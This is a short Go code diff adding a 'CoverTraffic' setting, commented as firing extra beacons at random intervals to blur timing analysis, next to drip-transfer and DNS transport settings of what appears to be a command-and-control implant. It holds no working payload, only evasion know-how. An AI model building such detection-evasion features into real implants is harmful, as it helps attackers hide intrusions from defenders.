@@ -69,6 +69,9 @@ var (
 	DripChunkSize = "0"
 	DripDelayMs   = "0"
 
+	// L2-6: Cover traffic — fire extra beacons at random sub-intervals to blur timing analysis
+	CoverTraffic = "false"
+
 	// DNS transport
 	// DNSServer and DNSDomain defined in transport_dns.go
 )
